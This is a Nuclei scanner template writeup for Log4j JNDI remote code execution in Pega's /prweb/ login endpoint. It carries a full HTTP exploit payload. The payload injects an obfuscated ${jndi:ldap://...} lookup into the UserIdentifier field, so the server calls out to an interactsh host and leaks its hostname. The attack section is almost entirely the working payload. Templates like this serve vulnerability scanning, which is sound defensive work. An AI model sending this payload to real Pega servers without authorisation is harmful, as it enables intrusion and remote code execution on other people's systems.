# Nuclei Template: Pega - Remote Code Execution (Apache Log4j)
**Template ID:** pega-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`pega-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Pega is susceptible to Log4j JNDI remote code execution. Pega provides a powerful low-code platform that empowers the world's leading enterprises to Build for Change.

## Steps to reproduce / Exploit Payload
```http
GET /prweb/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

POST {{location}} HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{location}}
Content-Type: application/x-www-form-urlencoded

pzAuth=guest&UserIdentifier=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&Password=a&pyActivity%3DCode-Security.Login=&lockScreenID=&lockScreenPassword=&newPassword=&confirmNewPassword=
```

## References
- https://docs.pega.com/security-advisory/security-advisory-apache-log4j-zero-day-vulnerability
